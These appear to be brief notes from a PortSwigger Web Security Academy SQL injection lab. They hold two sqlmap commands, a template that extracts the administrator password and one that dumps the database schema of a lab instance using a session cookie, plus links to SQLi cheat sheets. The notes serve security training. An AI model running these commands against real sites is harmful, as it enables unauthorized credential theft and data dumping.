____

```bash
sqlmap -u "URL" --cookie='lab=cookie' --level 5 --risk 3 -p param --batch --threads 10 --dbms=postgresql --sql-query="SELECT password from USERS where username='administrator'"
```

[https://tib3rius.com/sqli](https://tib3rius.com/sqli) 

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


```bash
sqlmap -u "https://0a9100e603500d0982375131006f00bc.web-security-academy.net/filter?category=Gifts" --cookie="session=7biRvfgHaUlvwd8pXfLeRYKYtYFxAkEx" --level 5 --risk 3 -p category --batch --threads 10 --dbms=postgresql --dump -D public
```






